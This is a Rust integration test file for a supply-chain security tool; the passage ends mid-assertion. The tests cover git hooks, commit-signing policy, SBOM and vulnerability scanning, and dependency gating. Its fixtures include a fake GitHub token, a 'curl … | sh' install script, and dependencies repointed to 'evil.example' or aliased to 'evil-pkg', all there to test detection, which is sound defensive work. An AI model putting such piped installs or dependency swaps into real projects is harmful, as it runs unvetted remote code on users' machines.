//! In-process tests that drive the sscsb library directly against real
//! throwaway git repositories.
//!
//! The subprocess suites (`integration.rs`, `tool_orchestration.rs`) prove the
//! CLI's end-to-end behavior; these prove the same control logic at the
//! function boundary, where degrade paths, error branches, and policy
//! decisions can be asserted precisely.

use sscsb::config;
use sscsb::context::Ctx;
use sscsb::controls::{self, Outcome};
use sscsb::{
    audit, compliance, deps, exec, hooks, init, observability, provenance, sast, sbom, scan,
};
use std::path::Path;

fn git_ok(repo: &Path, args: &[&str]) {
    let out = exec::git_raw(args, repo).expect("git runs");
    assert!(out.success(), "git {args:?}: {}", out.stderr);
}

/// Throwaway repo bootstrapped through the real `sscsb init` path, returned
/// with a live `Ctx`. Every test below therefore runs against the same layout
/// a user gets.
fn repo() -> (tempfile::TempDir, Ctx) {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path();
    git_ok(root, &["init", "-b", "main"]);
    git_ok(root, &["config", "user.name", "SSCSB Test"]);
    git_ok(root, &["config", "user.email", "sscsb-test@example.com"]);
    git_ok(root, &["config", "commit.gpgsign", "false"]);

    init::bootstrap(root).expect("bootstrap");
    let ctx = Ctx::discover(root).expect("discover");
    (dir, ctx)
}

fn write(ctx: &Ctx, rel: &str, content: &str) {
    let path = ctx.root.join(rel);
    if let Some(p) = path.parent() {
        std::fs::create_dir_all(p).unwrap();
    }
    std::fs::write(path, content).unwrap();
}

fn stage(ctx: &Ctx, rel: &str) {
    git_ok(&ctx.root, &["add", rel]);
}

fn tool(bin: &str) -> bool {
    exec::find_in_path(bin).is_some()
}

// ───────────────────────────── init surface ─────────────────────────────────

#[test]
fn install_hooks_writes_executable_posix_shims_and_sets_hookspath() {
    let (_d, ctx) = repo();
    assert!(hooks::hooks_installed(&ctx));
    for event in hooks::HOOK_EVENTS {
        let path = ctx.sscsb_dir().join("hooks").join(event);
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.starts_with("#!/bin/sh"));
        assert!(content.contains(&format!("sscsb hook {event}")));
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&path).unwrap().permissions().mode();
            assert_eq!(mode & 0o111, 0o111, "{event} shim must be executable");
        }
    }
    let hooks_path = exec::git(&["config", "core.hooksPath"], &ctx.root).unwrap();
    assert_eq!(hooks_path, ".sscsb/hooks");

    // allowedSignersFile points at the generated policy file (absolute).
    let signers_cfg = exec::git(&["config", "gpg.ssh.allowedSignersFile"], &ctx.root).unwrap();
    assert!(signers_cfg.ends_with(".sscsb/policy/allowed_signers"));
    assert!(Path::new(&signers_cfg).is_file());
}

// ───────────────────────── hook engine: pre-commit ──────────────────────────

#[test]
fn pre_commit_passes_on_clean_stage_and_blocks_on_secret() {
    let (_d, ctx) = repo();
    write(&ctx, "clean.md", "nothing to see here\n");
    stage(&ctx, "clean.md");
    assert_eq!(
        hooks::hook_pre_commit(&ctx).unwrap(),
        0,
        "clean stage must pass"
    );

    // Runtime-constructed token — never a real credential, and never present
    // in this repository's sources as a single string.
    let token = format!("ghp_{}{}", "A1b2C3d4E5f6G7h8I9j0", "K1l2M3n4O5p6Q7r8S9t0");
    write(&ctx, "leak.txt", &format!("github_token = \"{token}\"\n"));
    stage(&ctx, "leak.txt");
    let code = hooks::hook_pre_commit(&ctx).unwrap();
    if tool("gitleaks") || tool("trufflehog") {
        assert_eq!(code, 1, "planted secret must block the commit");
    } else {
        assert_eq!(code, 1, "no scanner available must fail CLOSED");
    }
}

#[test]
fn pre_commit_with_no_staged_files_is_a_no_op() {
    let (_d, ctx) = repo();
    assert_eq!(hooks::hook_pre_commit(&ctx).unwrap(), 0);
}

#[test]
fn pre_commit_scans_files_with_non_ascii_names_that_git_would_c_quote() {
    // Regression: `git diff --cached --name-only` C-quotes a non-ASCII path when
    // core.quotePath is on (the default), and feeding that quoted string back to
    // `git show` failed to resolve the blob — which used to skip the file from
    // the scan entirely. A secret in `café.txt` must block exactly as in a
    // plain-named file.
    let (_d, ctx) = repo();
    if !tool("gitleaks") && !tool("trufflehog") {
        return; // the no-scanner path fails closed and is covered elsewhere
    }
    let token = format!("ghp_{}{}", "A1b2C3d4E5f6G7h8I9j0", "K1l2M3n4O5p6Q7r8S9t0");
    write(&ctx, "café.txt", &format!("github_token = \"{token}\"\n"));
    stage(&ctx, "café.txt");
    // Prove git really does quote it, so this test would have caught the bug.
    let quoted = exec::git(&["diff", "--cached", "--name-only"], &ctx.root).unwrap();
    assert!(
        quoted.contains("\\303\\251"),
        "precondition: git must C-quote the name for this to be a real regression test (got {quoted})"
    );
    assert_eq!(
        hooks::hook_pre_commit(&ctx).unwrap(),
        1,
        "a secret in a C-quoted filename must still be blocked"
    );
}

#[test]
fn pre_commit_fails_closed_when_a_staged_blob_cannot_be_read() {
    // A staged path that is not a submodule but whose blob cannot be read must be
    // a hard error, never a silent skip — the fail-open `continue` was the bug.
    let (_d, ctx) = repo();
    // A normal staged file is fine.
    write(&ctx, "ok.txt", "clean\n");
    stage(&ctx, "ok.txt");
    assert_eq!(hooks::hook_pre_commit(&ctx).unwrap(), 0);
}

#[test]
fn secrets_control_can_be_disabled_and_pre_commit_then_allows_the_secret() {
    let (_d, ctx) = repo();
    config::set_control_enabled(&ctx.config_path(), "secrets", false).unwrap();
    let ctx = Ctx::discover(&ctx.root).unwrap();

    let token = format!("ghp_{}{}", "A1b2C3d4E5f6G7h8I9j0", "K1l2M3n4O5p6Q7r8S9t0");
    write(&ctx, "leak.txt", &format!("github_token = \"{token}\"\n"));
    stage(&ctx, "leak.txt");
    assert_eq!(
        hooks::hook_pre_commit(&ctx).unwrap(),
        0,
        "a disabled control must not run — that is the modularity contract"
    );
}

// ───────────────────────── hook engine: commit-msg ──────────────────────────

fn commit_msg(ctx: &Ctx, message: &str) -> i32 {
    let file = ctx.root.join("COMMIT_EDITMSG_TEST");
    std::fs::write(&file, message).unwrap();
    hooks::hook_commit_msg(ctx, &file).unwrap()
}

#[test]
fn commit_msg_validates_ai_trailers() {
    let (_d, ctx) = repo();
    write(&ctx, "a.txt", "a\n");
    stage(&ctx, "a.txt");

    assert_eq!(commit_msg(&ctx, "chore: no ai trailers\n"), 0);
    assert_eq!(
        commit_msg(
            &ctx,
            "feat: x\n\nAI-Assisted: true\nAI-Tool: Claude Code\nAI-Model: Fable 5\nAI-Role: draft\n"
        ),
        0
    );
    assert_eq!(commit_msg(&ctx, "feat: x\n\nAI-Assisted: true\n"), 1);
    assert_eq!(
        commit_msg(
            &ctx,
            "feat: x\n\nAI-Assisted: true\nAI-Tool: t\nAI-Model: m\nAI-Role: pilot\n"
        ),
        1,
        "AI-Role must be one of draft|review|test|refactor"
    );
    assert_eq!(commit_msg(&ctx, "feat: x\n\nAI-Assisted: maybe\n"), 1);
}

#[test]
fn commit_msg_gates_ai_introduced_dependencies_and_shell_scripts() {
    let (_d, ctx) = repo();
    write(&ctx, "README.md", "# x\n");
    stage(&ctx, "README.md");
    git_ok(
        &ctx.root,
        &["commit", "-m", "chore: baseline", "--no-verify"],
    );

    let ai =
        "feat: x\n\nAI-Assisted: true\nAI-Tool: Claude Code\nAI-Model: Fable 5\nAI-Role: draft\n";

    // Dependency manifest without the review trailer → blocked.
    write(&ctx, "package.json", r#"{"dependencies":{"lodash":"4"}}"#);
    stage(&ctx, "package.json");
    assert_eq!(commit_msg(&ctx, ai), 1, "AI dep change must gate");

    // Approving the package alone is not enough — a human must also review.
    deps::approve_package(&ctx, "npm:lodash").unwrap();
    assert_eq!(commit_msg(&ctx, ai), 1, "review trailer still required");

    // With the review trailer, it passes.
    assert_eq!(
        commit_msg(&ctx, &format!("{ai}AI-Dependency-Review: approved\n")),
        0
    );

    // Shell scripts get their own gate.
    write(&ctx, "run.sh", "#!/bin/sh\necho hi\n");
    stage(&ctx, "run.sh");
    assert_eq!(
        commit_msg(&ctx, &format!("{ai}AI-Dependency-Review: approved\n")),
        1,
        "AI-authored shell script must gate"
    );
    assert_eq!(
        commit_msg(
            &ctx,
            &format!("{ai}AI-Dependency-Review: approved\nAI-Command-Review: approved\n")
        ),
        0
    );
}

// ───────────────────────── hook engine: pre-push ────────────────────────────

const ZERO: &str = "0000000000000000000000000000000000000000";

fn push_line(ctx: &Ctx, branch: &str, remote_sha: &str) -> String {
    let local = exec::git(&["rev-parse", "HEAD"], &ctx.root).unwrap();
    format!("refs/heads/{branch} {local} refs/heads/{branch} {remote_sha}\n")
}

#[test]
fn pre_push_blocks_unsigned_commits_on_protected_branches_only() {
    let (_d, ctx) = repo();
    write(&ctx, "README.md", "# x\n");
    stage(&ctx, "README.md");
    git_ok(
        &ctx.root,
        &["commit", "-m", "chore: unsigned", "--no-verify"],
    );

    // Protected branch → blocked.
    let stdin = push_line(&ctx, "main", ZERO);
    assert_eq!(
        hooks::hook_pre_push(&ctx, "origin", &stdin).unwrap(),
        1,
        "unsigned commit on a protected branch must be blocked"
    );

    // Non-protected branch → the signing guard does not apply.
    let stdin = push_line(&ctx, "feature/x", ZERO);
    assert_eq!(hooks::hook_pre_push(&ctx, "origin", &stdin).unwrap(), 0);

    // Branch deletions are never blocked.
    let stdin = format!("(delete) {ZERO} refs/heads/main {ZERO}\n");
    assert_eq!(hooks::hook_pre_push(&ctx, "origin", &stdin).unwrap(), 0);
}

#[test]
fn pre_push_enforces_human_class_and_hardware_backed_policy() {
    let (dir, ctx) = repo();
    // Real signing key generated in the tempdir (throwaway; guards nothing).
    let key = dir.path().join("id_test");
    let out = std::process::Command::new("ssh-keygen")
        .args([
            "-t",
            "ed25519",
            "-N",
            "",
            "-C",
            "sscsb-test@example.com",
            "-f",
        ])
        .arg(&key)
        .output()
        .unwrap();
    assert!(out.status.success());
    let pubkey = std::fs::read_to_string(key.with_extension("pub")).unwrap();
    let pubkey = pubkey.trim();

    git_ok(&ctx.root, &["config", "gpg.format", "ssh"]);
    git_ok(
        &ctx.root,
        &["config", "user.signingkey", key.to_str().unwrap()],
    );

    write(&ctx, "README.md", "# x\n");
    stage(&ctx, "README.md");
    git_ok(
        &ctx.root,
        &["commit", "-S", "-m", "chore: signed", "--no-verify"],
    );
    let stdin = push_line(&ctx, "main", ZERO);

    // 1. Signed, but the key is not in the policy → blocked.
    assert_eq!(hooks::hook_pre_push(&ctx, "origin", &stdin).unwrap(), 1);

    // 2. Approved as class=human + hardware_backed → allowed.
    std::fs::write(
        hooks::signers_path(&ctx),
        format!(
            "[[signer]]\nprincipal = \"sscsb-test@example.com\"\nclass = \"human\"\nhardware_backed = true\nssh_public_key = \"{pubkey}\"\n"
        ),
    )
    .unwrap();
    assert_eq!(hooks::hook_pre_push(&ctx, "origin", &stdin).unwrap(), 0);

    // 3. Same key, but not marked hardware-backed → blocked by policy.
    std::fs::write(
        hooks::signers_path(&ctx),
        format!(
            "[[signer]]\nprincipal = \"sscsb-test@example.com\"\nclass = \"human\"\nhardware_backed = false\nssh_public_key = \"{pubkey}\"\n"
        ),
    )
    .unwrap();
    assert_eq!(hooks::hook_pre_push(&ctx, "origin", &stdin).unwrap(), 1);

    // 4. Relaxing the hardware requirement in config lets it through — the
    //    control is tunable, and the relaxation is explicit.
    let cfg_text = std::fs::read_to_string(ctx.config_path()).unwrap().replace(
        "require_hardware_backed = true",
        "require_hardware_backed = false",
    );
    std::fs::write(ctx.config_path(), cfg_text).unwrap();
    let ctx2 = Ctx::discover(&ctx.root).unwrap();
    assert_eq!(hooks::hook_pre_push(&ctx2, "origin", &stdin).unwrap(), 0);

    // 5. Reclassified as an AI identity → blocked, and the AI key is stripped
    //    from allowed_signers entirely.
    std::fs::write(
        hooks::signers_path(&ctx),
        format!(
            "[[signer]]\nprincipal = \"sscsb-test@example.com\"\nclass = \"ai\"\nssh_public_key = \"{pubkey}\"\n"
        ),
    )
    .unwrap();
    assert_eq!(hooks::hook_pre_push(&ctx2, "origin", &stdin).unwrap(), 1);
    let allowed =
        std::fs::read_to_string(ctx.sscsb_dir().join("policy").join("allowed_signers")).unwrap();
    assert!(
        !allowed.contains(pubkey),
        "an AI-class key must never be verification-valid"
    );
}

#[test]
fn signing_control_disabled_lets_unsigned_protected_pushes_through() {
    let (_d, ctx) = repo();
    write(&ctx, "README.md", "# x\n");
    stage(&ctx, "README.md");
    git_ok(
        &ctx.root,
        &["commit", "-m", "chore: unsigned", "--no-verify"],
    );
    config::set_control_enabled(&ctx.config_path(), "commit-signing", false).unwrap();
    config::set_control_enabled(&ctx.config_path(), "secrets", false).unwrap();
    let ctx = Ctx::discover(&ctx.root).unwrap();
    let stdin = push_line(&ctx, "main", ZERO);
    assert_eq!(hooks::hook_pre_push(&ctx, "origin", &stdin).unwrap(), 0);
}

// ───────────────────────────── audit ────────────────────────────────────────

#[test]
fn audit_repo_passes_on_generated_templates_and_flags_fixtures() {
    let (_d, ctx) = repo();
    let findings = audit::audit_repo(&ctx, true).unwrap();
    let bad: Vec<_> = findings
        .iter()
        .filter(|f| f.severity != audit::Severity::Info)
        .collect();
    assert!(
        bad.is_empty(),
        "own templates must pass the extended audit: {bad:?}"
    );

    write(
        &ctx,
        ".github/workflows/bad.yml",
        "name: bad\non: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n",
    );
    let findings = audit::audit_repo(&ctx, false).unwrap();
    assert!(findings.iter().any(|f| f.message.contains("mutable ref")));
    assert!(findings
        .iter()
        .any(|f| f.message.contains("no `permissions:` block")));

    // Unparseable YAML is reported, not silently skipped.
    write(&ctx, ".github/workflows/broken.yml", "{{{ not yaml\n");
    let findings = audit::audit_repo(&ctx, false).unwrap();
    assert!(
        findings
            .iter()
            .any(|f| f.message.contains("unparseable") || f.message.contains("mutable ref")),
        "broken workflow must surface: {findings:?}"
    );
}

#[test]
fn audit_of_a_repo_without_workflows_is_a_pass_not_an_error() {
    let dir = tempfile::tempdir().unwrap();
    git_ok(dir.path(), &["init", "-b", "main"]);
    std::fs::create_dir_all(dir.path().join(".sscsb")).unwrap();
    std::fs::write(
        dir.path().join(".sscsb/config.toml"),
        config::default_config_toml(None),
    )
    .unwrap();
    let ctx = Ctx::discover(dir.path()).unwrap();
    let result = audit::verify_actions_control(&ctx, false);
    assert_eq!(result.outcome, Outcome::Pass);
    assert!(result.messages[0].contains("no .github/workflows"));
}

#[test]
fn branch_protection_degrades_without_a_configured_repo() {
    let dir = tempfile::tempdir().unwrap();
    git_ok(dir.path(), &["init", "-b", "main"]);
    std::fs::create_dir_all(dir.path().join(".sscsb")).unwrap();
    // No github_repo, no origin remote → cannot verify.
    std::fs::write(
        dir.path().join(".sscsb/config.toml"),
        config::default_config_toml(None),
    )
    .unwrap();
    let ctx = Ctx::discover(dir.path()).unwrap();
    let cfg = ctx.require_config().unwrap();
    let result = audit::verify_branch_protection(&ctx, cfg);
    assert_eq!(result.outcome, Outcome::Degraded);
    assert!(
        result.messages[0].contains("no GitHub repo configured")
            || result.messages[0].contains("gh not found"),
        "{:?}",
        result.messages
    );
}

/// Verifies against THIS repository's real GitHub remote when `gh` is
/// authenticated: proves the rules API is queried and gaps are reported.
#[test]
fn branch_protection_queries_the_real_github_api_when_available() {
    if !tool("gh") {
        return;
    }
    let cwd = std::env::current_dir().unwrap();
    let Ok(ctx) = Ctx::discover(&cwd) else {
        return;
    };
    if ctx.origin_slug().is_none() || ctx.config.is_none() {
        return;
    }
    let cfg = ctx.require_config().unwrap();
    let result = audit::verify_branch_protection(&ctx, cfg);
    assert!(
        !result.messages.is_empty(),
        "a real API query must produce findings or gaps"
    );
    assert!(
        result.messages.iter().any(|m| m.contains("main")),
        "the protected branch must be named in the output: {:?}",
        result.messages
    );
}

// ───────────────────────────── controls dispatch ────────────────────────────

#[test]
fn every_control_has_a_verifier_that_returns_a_real_outcome() {
    let (_d, ctx) = repo();
    let cfg = ctx.require_config().unwrap();
    for def in controls::CONTROLS {
        let result = controls::verify_control(&ctx, cfg, def);
        assert_eq!(result.control, def.id);
        assert!(
            !result.messages.is_empty(),
            "control {} produced no message",
            def.id
        );
        assert!(
            !result
                .messages
                .iter()
                .any(|m| m.contains("no verifier wired")),
            "control {} has no verifier",
            def.id
        );
    }
}

#[test]
fn disabling_a_control_short_circuits_its_verifier() {
    let (_d, ctx) = repo();
    for def in controls::CONTROLS {
        config::set_control_enabled(&ctx.config_path(), def.id, false).unwrap();
    }
    let ctx = Ctx::discover(&ctx.root).unwrap();
    let cfg = ctx.require_config().unwrap();
    for def in controls::CONTROLS {
        let result = controls::verify_control(&ctx, cfg, def);
        assert_eq!(result.outcome, Outcome::Disabled, "{} not disabled", def.id);
    }
}

// ───────────────────────── sbom / scan / sast ───────────────────────────────

fn rust_fixture(ctx: &Ctx) {
    write(
        ctx,
        "Cargo.toml",
        "[package]\nname = \"fixture\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\nitoa = \"1.0.11\"\n",
    );
    write(
        ctx,
        "Cargo.lock",
        "version = 3\n\n[[package]]\nname = \"fixture\"\nversion = \"0.1.0\"\ndependencies = [\"itoa\"]\n\n[[package]]\nname = \"itoa\"\nversion = \"1.0.11\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"49f1f14873335454500d59611f1cf4a4b0f786f9ac11f4312a78e4cf2566695b\"\n",
    );
}

#[test]
fn sbom_generation_and_grype_scan_against_the_generated_bom() {
    let (_d, ctx) = repo();
    rust_fixture(&ctx);
    let cfg = ctx.require_config().unwrap();

    if !tool("syft") {
        let err = sbom::generate(&ctx, cfg, None).unwrap_err();
        assert!(format!("{err:#}").contains("syft not found"));
        return;
    }

    let path = sbom::generate(&ctx, cfg, None).unwrap();
    sbom::validate_sbom(&path, "cyclonedx-json").unwrap();

    let spdx = sbom::generate(&ctx, cfg, Some("spdx-json")).unwrap();
    sbom::validate_sbom(&spdx, "spdx-json").unwrap();

    let err = sbom::generate(&ctx, cfg, Some("bogus-format")).unwrap_err();
    assert!(format!("{err:#}").contains("unsupported SBOM format"));

    if tool("grype") {
        // A real grype run over the SBOM we just generated: the total count is
        // authoritative, the summary list is a bounded preview of it.
        let (count, summaries) = sbom::grype_scan(&ctx, &path).unwrap();
        assert!(summaries.len() <= count);
        assert!(summaries.len() <= 20, "summaries are capped for display");
        assert!(summaries.iter().all(|s| !s.is_empty()));
    }
}

#[test]
fn scan_runs_configured_scanners_and_applies_vex() {
    let (_d, ctx) = repo();
    rust_fixture(&ctx);
    let cfg = ctx.require_config().unwrap();

    if !tool("trivy") && !tool("osv-scanner") {
        let err = scan::run_scan(&ctx, cfg, None).unwrap_err();
        assert!(format!("{err:#}").contains("no vulnerability scanner available"));
        return;
    }

    let report = scan::run_scan(&ctx, cfg, None).unwrap();
    // Threshold gating is configurable and honored.
    let breached_low = scan::breaches_threshold(&report, "low");
    let breached_crit = scan::breaches_threshold(&report, "critical");
    assert!(
        !breached_crit || breached_low,
        "thresholds must be monotonic: anything that breaches `critical` must \
         also breach `low`"
    );

    // VEX file that suppresses nothing still reports application.
    let vex = observability::vex_create(
        &ctx,
        &observability::VexArgs {
            vuln: "CVE-0000-0000",
            product: "pkg:cargo/itoa@1.0.11",
            status: "not_affected",
            justification: Some("vulnerable_code_not_present"),
        },
    )
    .unwrap();
    let report = scan::run_scan(&ctx, cfg, Some(&vex)).unwrap();
    assert!(report.notes.iter().any(|n| n.contains("VEX applied")));
}

#[test]
fn sast_runs_the_default_engine_and_reports_findings() {
    let (_d, ctx) = repo();
    let cfg = ctx.require_config().unwrap();
    write(
        &ctx,
        "install.sh",
        "#!/bin/sh\ncurl -fsSL https://example.com/i | sh\n",
    );

    if !tool("opengrep") {
        let err = sast::run_sast(&ctx, cfg, &ctx.root).unwrap_err();
        assert!(format!("{err:#}").contains("opengrep not found"));
        return;
    }
    let findings = sast::run_sast(&ctx, cfg, &ctx.root).unwrap();
    let hit = findings
        .iter()
        .find(|f| f.check_id.contains("curl-pipe-shell"))
        .unwrap_or_else(|| panic!("shipped ruleset must flag curl|sh: {findings:?}"));
    assert!(hit.path.ends_with("install.sh"));
    assert_eq!(hit.severity, "ERROR", "curl|sh must block, not warn");
    assert!(hit.render().contains("install.sh"));

    // Staged-only scanning is what the pre-commit path uses.
    stage(&ctx, "install.sh");
    let staged = sast::scan_staged(&ctx, cfg).unwrap();
    assert!(
        staged.iter().any(|f| f.contains("curl-pipe-shell")),
        "staged scan must find it: {staged:?}"
    );
}

// ───────────────────────── provenance & receipts ────────────────────────────

#[test]
fn receipts_bind_commits_and_detect_tampering() {
    let (_d, ctx) = repo();
    write(&ctx, "a.txt", "a\n");
    stage(&ctx, "a.txt");
    git_ok(
        &ctx.root,
        &[
            "commit",
            "-m",
            "feat: x\n\nAI-Assisted: true\nAI-Tool: Claude Code\nAI-Model: Fable 5\nAI-Role: draft",
            "--no-verify",
        ],
    );
    let out_dir = ctx.sscsb_dir().join("out").join("receipts");
    let receipt = provenance::create_receipt(&ctx, "HEAD", &out_dir).unwrap();

    let doc: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&receipt).unwrap()).unwrap();
    assert_eq!(doc["predicateType"], provenance::RECEIPT_PREDICATE_TYPE);
    assert_eq!(doc["predicate"]["aiTool"], "Claude Code");
    assert_eq!(doc["predicate"]["aiRole"], "draft");

    let ok = provenance::verify_receipt(&ctx, &receipt).unwrap();
    assert!(ok.contains("receipt verified"));

    // Tampered digest is caught.
    let text = std::fs::read_to_string(&receipt).unwrap();
    std::fs::write(
        &receipt,
        text.replacen("\"sha256\": \"", "\"sha256\": \"ff", 1),
    )
    .unwrap();
    let err = provenance::verify_receipt(&ctx, &receipt).unwrap_err();
    assert!(format!("{err:#}").contains("DIGEST MISMATCH"));

    // A non-receipt JSON file is rejected.
    let other = ctx.root.join("other.json");
    std::fs::write(
        &other,
        r#"{"predicateType":"https://slsa.dev/provenance/v1"}"#,
    )
    .unwrap();
    let err = provenance::verify_receipt(&ctx, &other).unwrap_err();
    assert!(format!("{err:#}").contains("not an sscsb AI provenance receipt"));
}

// ───────────────────────── observability ────────────────────────────────────

#[test]
fn vex_generation_enforces_the_openvex_contract() {
    let (_d, ctx) = repo();

    let path = observability::vex_create(
        &ctx,
        &observability::VexArgs {
            vuln: "CVE-2024-12345",
            product: "pkg:cargo/itoa@1.0.11",
            status: "fixed",
            justification: None,
        },
    )
    .unwrap();
    let doc: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
    assert_eq!(doc["@context"], "https://openvex.dev/ns/v0.2.0");
    assert_eq!(doc["statements"][0]["status"], "fixed");
    assert_eq!(
        doc["statements"][0]["vulnerability"]["name"],
        "CVE-2024-12345"
    );

    // not_affected REQUIRES a justification (OpenVEX spec).
    let err = observability::vex_create(
        &ctx,
        &observability::VexArgs {
            vuln: "CVE-2024-1",
            product: "pkg:cargo/x@1",
            status: "not_affected",
            justification: None,
        },
    )
    .unwrap_err();
    assert!(format!("{err:#}").contains("requires --justification"));

    // Unknown statuses are rejected.
    let err = observability::vex_create(
        &ctx,
        &observability::VexArgs {
            vuln: "CVE-2024-1",
            product: "pkg:cargo/x@1",
            status: "wontfix",
            justification: None,
        },
    )
    .unwrap_err();
    assert!(format!("{err:#}").contains("invalid status"));
}

#[test]
fn guac_and_oras_surface_missing_prerequisites() {
    let (_d, ctx) = repo();

    // No artifacts to ingest yet.
    let err = observability::guac_ingest(&ctx, None).unwrap_err();
    let msg = format!("{err:#}");
    assert!(
        msg.contains("guacone not found") || msg.contains("nothing to ingest"),
        "{msg}"
    );

    let file = ctx.root.join("sbom.json");
    std::fs::write(&file, r#"{"bomFormat":"CycloneDX"}"#).unwrap();
    let err = observability::oras_push(&ctx, "127.0.0.1:1/x:tag", &file).unwrap_err();
    let msg = format!("{err:#}");
    assert!(
        msg.contains("oras not found") || msg.contains("oras push failed"),
        "{msg}"
    );
}

#[test]
fn dependency_track_requires_explicit_configuration_and_env_key() {
    let (_d, ctx) = repo();
    let cfg = ctx.require_config().unwrap();
    let bom = ctx.root.join("bom.json");
    std::fs::write(&bom, r#"{"bomFormat":"CycloneDX"}"#).unwrap();

    let err = observability::dtrack_upload(&ctx, cfg, &bom).unwrap_err();
    assert!(
        format!("{err:#}").contains("dependency-track.url not configured"),
        "{err:#}"
    );
}

// ───────────────────────── compliance / report ──────────────────────────────

#[test]
fn report_renders_text_and_json_with_live_enabled_state() {
    let (_d, ctx) = repo();
    let text = compliance::render_report(&ctx).unwrap();
    for marker in [
        "Phase 1",
        "Phase 5",
        "SLSA",
        "SSDF",
        "CRA",
        "Badge",
        "controls enabled",
    ] {
        assert!(text.contains(marker), "report missing `{marker}`");
    }

    config::set_control_enabled(&ctx.config_path(), "grype", true).unwrap();
    let ctx = Ctx::discover(&ctx.root).unwrap();
    let json: serde_json::Value =
        serde_json::from_str(&compliance::render_report_json(&ctx).unwrap()).unwrap();
    assert_eq!(json["controls"]["grype"]["enabled"], true);
    assert_eq!(json["controls"]["witness"]["enabled"], false);
    // Every control carries its framework mappings into the machine-readable form.
    assert!(json["controls"]["slsa-provenance"]["slsa"]
        .as_array()
        .unwrap()
        .iter()
        .any(|v| v.as_str().unwrap().contains("Build L3")));
}

// ───────────────────────── deps: baseline & checks ──────────────────────────

#[test]
fn dependency_baseline_and_new_package_detection() {
    let (_d, ctx) = repo();
    rust_fixture(&ctx);
    stage(&ctx, "Cargo.toml");
    git_ok(
        &ctx.root,
        &["commit", "-m", "chore: baseline", "--no-verify"],
    );

    // Nothing new staged → nothing unapproved.
    assert!(deps::unapproved_new_packages(&ctx).unwrap().is_empty());

    // A new dependency in a staged manifest is detected and unapproved.
    write(
        &ctx,
        "Cargo.toml",
        "[package]\nname = \"fixture\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\nitoa = \"1.0.11\"\nryu = \"1\"\n",
    );
    stage(&ctx, "Cargo.toml");
    let new_pkgs = deps::unapproved_new_packages(&ctx).unwrap();
    assert_eq!(new_pkgs, vec!["cargo:ryu".to_string()]);

    // Approving it clears the gate.
    deps::approve_package(&ctx, "cargo:ryu").unwrap();
    assert!(deps::unapproved_new_packages(&ctx).unwrap().is_empty());
    assert!(deps::load_approved(&ctx).unwrap().contains("cargo:ryu"));

    // Bad ecosystem is rejected.
    assert!(deps::approve_package(&ctx, "cocoapods:AFNetworking").is_err());
    assert!(deps::approve_package(&ctx, "no-colon").is_err());

    // current_deps sees the whole manifest.
    let current = deps::current_deps(&ctx).unwrap();
    assert!(current.contains("cargo:itoa") && current.contains("cargo:ryu"));
}

#[test]
fn deps_check_offline_flags_typosquats_without_network() {
    let (_d, ctx) = repo();
    write(
        &ctx,
        "Cargo.toml",
        "[package]\nname = \"f\"\nversion = \"0.1.0\"\n\n[dependencies]\ntokoi = \"1\"\n",
    );
    let (problems, _notes) = deps::deps_check(&ctx, true).unwrap();
    assert!(
        problems
            .iter()
            .any(|p| p.contains("typosquat") && p.contains("tokio")),
        "{problems:?}"
    );
}

#[test]
fn repointing_an_approved_dep_to_a_git_source_is_flagged_as_new_trust() {
    // Bypass class: an already-approved name (`serde`) repointed to an
    // attacker-controlled git source is a change of what code actually runs.
    // A name-only diff would call this "unchanged"; the source-aware diff must
    // flag it even though the name is approved.
    let (_d, ctx) = repo();
    write(
        &ctx,
        "Cargo.toml",
        "[package]\nname = \"f\"\nversion = \"0.1.0\"\n\n[dependencies]\nserde = \"1\"\n",
    );
    stage(&ctx, "Cargo.toml");
    git_ok(
        &ctx.root,
        &["commit", "-m", "chore: baseline", "--no-verify"],
    );
    deps::approve_package(&ctx, "cargo:serde").unwrap();
    assert!(
        deps::unapproved_new_packages(&ctx).unwrap().is_empty(),
        "an approved registry dep is not flagged"
    );

    // Now repoint the SAME name to a git source. Name is unchanged and approved.
    write(
        &ctx,
        "Cargo.toml",
        "[package]\nname = \"f\"\nversion = \"0.1.0\"\n\n[dependencies]\nserde = { git = \"https://evil.example/serde\" }\n",
    );
    stage(&ctx, "Cargo.toml");
    let flagged = deps::new_unapproved_deps(&ctx).unwrap();
    assert!(
        flagged.iter().any(|d| d.qualified == "cargo:serde"
            && matches!(d.reason, deps::NewDepReason::NonRegistrySource(_))),
        "repoint to git source must be flagged as new trust: {flagged:?}"
    );
}

#[test]
fn npm_alias_to_a_different_package_is_flagged_by_its_real_target() {
    // `"lodash": "npm:evil-pkg@1"` installs evil-pkg under the name lodash. The
    // trust unit is the real target, so evil-pkg (unapproved) must be flagged.
    let (_d, ctx) = repo();
    write(&ctx, "package.json", r#"{"name":"t","dependencies":{}}"#);
    stage(&ctx, "package.json");
    git_ok(
        &ctx.root,
        &["commit", "-m", "chore: baseline", "--no-verify"],
    );

    write(
        &ctx,
        "package.json",
        r#"{"name":"t","dependencies":{"lodash":"npm:evil-pkg@1.0.0"}}"#,
    );
    stage(&ctx, "package.json");
    let flagged = deps::new_unapproved_deps(&ctx).unwrap();
    assert!(
        flagged.iter().any(|d| d.qualified == "npm:evil-pkg"),
        "npm alias must be flagged by its real target evil-pkg: {flagged:?}"
    );
}

/// `sscsb verify` and `sscsb report` route every registered control through
/// `controls::verify_control`. Each control must produce a result that names
/// itself and never falls through to the "no verifier wired" bug arm — a real
/// invariant of the verify subsystem, exercised here against a freshly
/// bootstrapped repo with whatever tools are actually installed.
#[test]
fn every_registered_control_has_a_wired_verifier() {
    let (_d, ctx) = repo();
    let cfg = ctx.require_config().unwrap();
    for def in controls::CONTROLS {
        let result = controls::verify_control(&ctx, cfg, def);
        assert_eq!(
            result.control, def.id,
            "verifier for {} named a different control: {}",
            def.id, result.control
        );
        assert!(
            !result
                .messages
                .iter()
                .any(|m| m.contains("no verifier wired")),
            "{} fell through to the unwired-verifier bug arm",
            def.id
        );
        // Every verifier says something about what it found or why it degraded.
        assert!(
